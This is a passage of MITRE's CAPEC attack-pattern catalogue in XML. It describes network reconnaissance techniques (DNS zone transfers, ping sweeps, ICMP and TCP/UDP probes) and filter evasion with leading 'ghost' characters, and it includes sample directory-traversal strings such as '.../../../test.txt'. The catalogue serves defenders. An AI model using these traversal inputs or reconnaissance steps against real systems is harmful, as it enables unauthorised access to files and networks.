               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 38"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="291" Name="DNS Zone Transfers" Abstraction="Detailed" Status="Stable">
         <Description>An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="309"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to a DNS server that allows Zone transfers.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 34"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="292" Name="Host Discovery" Abstraction="Standard" Status="Stable">
         <Description>An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires logical access to the target network in order to carry out host discovery.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1049</Entry_ID>
               <Entry_Name>Local network connection enumeration</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1018</Entry_ID>
               <Entry_Name>Remote System Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 1: Footprinting, pp.44"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.6 Host Discover Techniques, pg.57"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="293" Name="Traceroute Route Enumeration" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="309"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A network capable of routing the attackers' packets to the destination network.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A command line version of traceroute or similar tool that performs route enumeration.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 38-41"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="294" Name="ICMP Address Mask Request" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, "Internet Standard Subnetting Procedure." An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address. Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the adversary determine operating system or firmware version. Additionally, because these types of messages are rare, they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 53-54"/>
            <Reference External_Reference_ID="REF-139"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-125"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.7.2 ICMP Probe Selection, pg. 70"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="295" Name="Timestamp Request" Abstraction="Detailed" Status="Stable">
         <Description>This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send a timestamp request to a remote target and receive a response.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Scanners or utilities that provide the ability to send custom ICMP queries.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.</Example>
            <Example>An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1124</Entry_ID>
               <Entry_Name>System Time Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 44-51"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-125"/>
            <Reference External_Reference_ID="REF-147" Section="Section 3.7.2 ICMP Probe Selection, pg. 70"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">ICMP Timestamp Request</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="296" Name="ICMP Information Request" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends an ICMP Information Request to a host to determine if it will respond to this deprecated mechanism. ICMP Information Requests are a deprecated message type. Information Requests were originally used for diskless machines to automatically obtain their network configuration, but this message type has been superseded by more robust protocol implementations like DHCP.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary needs to know certain linux commands for this type of attack.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Scanners or utilities that provide the ability to send custom ICMP queries.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pp. 44-51"/>
            <Reference External_Reference_ID="REF-123"/>
            <Reference External_Reference_ID="REF-124"/>
            <Reference External_Reference_ID="REF-125"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.7.2 ICMP Probe Selection, pg. 70"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="297" Name="TCP ACK Ping" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends a TCP segment with the ACK flag set to a remote host for the purpose of determining if the host is alive. This is one of several TCP 'ping' types. The RFC 793 expected behavior for a service is to respond with a RST 'reset' packet to any unsolicited ACK segment that is not part of an existing connection. So by sending an ACK segment to a port, the adversary can identify that the host is alive by looking for a RST packet. Typically, a remote server will respond with a RST regardless of whether a port is open or closed. In this way, TCP ACK pings cannot discover the state of a remote port because the behavior is the same in either case. The firewall will look up the ACK packet in its state-table and discard the segment because it does not correspond to any active connection. A TCP ACK Ping can be used to discover if a host is alive via RST response packets sent from the host.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.</Prerequisite>
            <Prerequisite>The target must employ a stateless firewall that lacks a rule set that rejects unsolicited ACK packets.</Prerequisite>
            <Prerequisite>The adversary requires the ability to craft custom TCP ACK segments for use during network reconnaissance. Sending an ACK ping requires the ability to access "raw sockets" in order to create the packets with direct access to the packet header.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Leverage stateful firewalls that allow for the rejection of a packet that is not part of an existing connection.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 49"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.6.2 TCP ACK Ping, pg. 61"/>
            <Reference External_Reference_ID="REF-125"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="298" Name="UDP Ping" Abstraction="Detailed" Status="Stable">
         <Description>An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires the ability to send a UDP datagram to a remote host and receive a response.</Prerequisite>
            <Prerequisite>The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.</Prerequisite>
            <Prerequisite>The target's firewall must not be configured to block egress ICMP messages.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Configure your firewall to block egress ICMP messages.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 47"/>
            <Reference External_Reference_ID="REF-158"/>
            <Reference External_Reference_ID="REF-125"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.6.3 TCP UDP Ping, pg. 63"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="299" Name="TCP SYN Ping" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN "synchronize" packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST "reset" packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response. Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present, SYN pings are preferable to ACK pings because a stateful firewall will typically drop all unsolicited ACK packets as they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. Often, an adversary will alternate between SYN and ACK pings to discover if a host is alive.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="292"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary needs to know how to craft and send protocol commands from the command line or within a tool.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 48"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 3.6.2 TCP SYN Ping, pg. 61"/>
            <Reference External_Reference_ID="REF-125"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="3" Name="Using Leading 'Ghost' Character Sequences to Bypass Input Filters" Abstraction="Detailed" Status="Draft">
         <Description>Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading "ghost" characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Determine if the source code is available and if so, examine the filter logic.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>If the source code is not available, write a small program that loops through various possible inputs to given API call and tries a variety of alternate (but equivalent) encodings of strings with leading ghost characters. Knowledge of frameworks and libraries used and what filters they apply will help to make this search more structured.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>Observe the effects. See if the probes are getting past the filters. Identify a string that is semantically equivalent to that which an adversary wants to pass to the targeted API, but syntactically structured in a way as to get past the input filter. That encoding will contain certain ghost characters that will help it get past the filters. These ghost characters will be ignored by the targeted API.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>Once the "winning" alternate encoding using (typically leading) ghost characters is identified, an adversary can launch the attacks against the targeted API (e.g. directory traversal attack, arbitrary shell command execution, corruption of files)</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The ability to make an API request, and knowledge of "ghost" characters that will not be filtered by any input validation. These "ghost" characters must be known to not affect the way in which the request will be interpreted.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Perform white list rather than black list input validation.</Mitigation>
            <Mitigation>Canonicalize all data prior to validation.</Mitigation>
            <Mitigation>Take an iterative approach to input validation (defense in depth).</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Alternate Encoding with Ghost Characters in FTP and Web Servers</xhtml:p>
               <xhtml:p>Some web and FTP servers fail to detect prohibited upward directory traversals if the user-supplied pathname contains extra characters such as an extra leading dot. For example, a program that will disallow access to the pathname "../test.txt" may erroneously allow access to that file if the pathname is specified as ".../test.txt". This attack succeeds because 1) the input validation logic fails to detect the triple-dot as a directory traversal attempt (since it isn't dot-dot), 2) some part of the input processing decided to strip off the "extra" dot, leaving the dot-dot behind.</xhtml:p>
               <xhtml:p>Using the file system API as the target, the following strings are all equivalent to many programs:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">.../../../test.txt<xhtml:br/>............/../../test.txt<xhtml:br/>..?/../../test.txt<xhtml:br/>..????????/../../test.txt<xhtml:br/>../test.txt</xhtml:div>
               <xhtml:p>As you can see, there are many ways to make a semantically equivalent request. All these strings ultimately result in a request for the file ../test.txt.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="41"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="179"/>
            <Related_Weakness CWE_ID="180"/>
            <Related_Weakness CWE_ID="181"/>
            <Related_Weakness CWE_ID="183"/>
            <Related_Weakness CWE_ID="184"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
